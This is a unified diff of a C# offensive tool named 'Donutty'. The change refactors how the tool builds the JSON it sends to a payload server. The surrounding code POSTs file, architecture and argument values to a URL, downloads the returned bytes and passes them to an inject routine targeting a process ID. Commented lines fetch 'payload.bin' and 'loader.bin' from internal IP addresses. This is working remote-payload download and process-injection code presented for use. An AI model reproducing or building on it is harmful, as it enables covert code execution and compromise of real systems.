@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
@@ -8,6 +8,7 @@ using System.Threading;
 using System.Net;
 using System.IO;
 using System.Net.Http;
+using Newtonsoft.Json;
 
 namespace Donutty
 {
@@ -182,26 +183,30 @@ namespace Donutty
             #region Web request
 
             WebClient wc = new WebClient();
+            
+            object tmp = new
+            {
+                file = arguments["/f"],
+                arch = arguments["/a"],
+                args = arguments["/params"],
+            };
+            string json = JsonConvert.SerializeObject(tmp);
+            
+            
             var httpWebRequest = (HttpWebRequest)WebRequest.Create(url);
             httpWebRequest.ContentType = "application/json";
             httpWebRequest.Method = "POST";
             using (var streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
             {
-                string json = "{\"file\":" + String.Format("\"{0}\",", file) +
-                              String.Format("\"arch\":\"{0}\",", arch) +
-                              String.Format("\"args\":\"{0}\"", parameters) + "}";
-
                 streamWriter.Write(json);
             }
-
-
             var httpResponse = (HttpWebResponse)httpWebRequest.GetResponse();
             using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
             {
                 var result = streamReader.ReadToEnd();
             }
             
-            //byte[] buf = wc.DownloadData("http://10.0.0.86:8000/payload.bin");
+            //[] buf = wc.DownloadData("http://10.0.0.90:8001/loader.bin");
             byte[] memBuf = wc.DownloadData(url);
             byte[] buf = memBuf;
             inject(buf, PID);
